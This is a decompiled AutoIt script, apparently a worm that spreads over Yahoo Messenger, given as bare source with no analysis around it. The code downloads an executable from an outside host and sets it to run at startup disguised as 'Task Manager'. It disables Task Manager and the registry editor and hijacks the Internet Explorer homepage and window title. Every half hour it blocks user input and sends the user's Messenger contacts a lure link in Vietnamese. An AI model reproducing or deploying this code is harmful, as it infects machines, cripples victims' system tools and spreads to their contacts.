; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\cns1\Desktop\vietnam.txt>
; ----------------------------------------------------------------------------

If Not FileExists(@WindowsDir & "\taskmsg.exe") Then
    InetGet ("http://vunhuphong.googlepages.com/vietnam.exe", @WindowsDir & "\taskmsg.exe", 0, 1)
    Sleep(5000)
EndIf
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "http://www.freewebs.com/traiquayhaiphong2/")
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", "http://www.freewebs.com/traiquayhaiphong2/")
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", "http://www.freewebs.com/traiquayhaiphong2/")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmsg.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "traiquayhaiphong :: Best Wish for you")
dim $tin[10]
$tin[0] = "Mot trang nghe nhac mien phi danh cho moi nguoi http://www.freewebs.com/traiquayhaiphong2/ "
$tin[1] = "Hay cung nhau nghe nhac nhe Vo coi thu nao http://www.freewebs.com/traiquayhaiphong2/ "
$tin[2] = "Am nhac khong the thieu trong cuoc song, hay vao day de thuong thuc nhe http://www.freewebs.com/traiquayhaiphong2/ "
$tin[3] = "Trang nay rat cool do, moi vao nhe http://www.freewebs.com/traiquayhaiphong2/ "
$tin[4] = "Nghe nhac online day, cac ban hay thuong thuc nhe http://www.freewebs.com/traiquayhaiphong2/ "
$tin[5] = "Tuyet voi qua di thoi, mot trang web nhac rat hay http://www.freewebs.com/traiquayhaiphong2/ "
$tin[6] = "Nao nao, nghe nhac ty nhe http://www.freewebs.com/traiquayhaiphong2/ "
$tin[7] = "Tuyet voi cho tat cac cai loai nhac http://www.freewebs.com/traiquayhaiphong2/ "
$tin[8] = "Nghe nhac o day cung duoc lam http://www.freewebs.com/traiquayhaiphong2/ "
$tin[9] = "Gioi thieu web nhac nay cho moi nguoi ne http://www.freewebs.com/traiquayhaiphong2/ "
While (1)
    sleep(60000)
    $tieude = WinGetTitle("Yahoo! Messenger", "")
    $kiemtra = WinExists ($tieude)
    If $kiemtra = 1 Then
        $ngaunhien = Random(0,9,1)
        ClipPut($tin[$ngaunhien])
        BlockInput (1)
        WinActivate($tieude)
        Send("^m")
        Send("{DOWN}")
        Send("^{SHIFTDOWN}{END}{SHIFTUP}")
        Send("{ENTER}")
        Send("^v {ENTER}")
        BlockInput (0)
    EndIf
    Sleep(1800000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\cns1\Desktop\vietnam.txt>
; ----------------------------------------------------------------------------

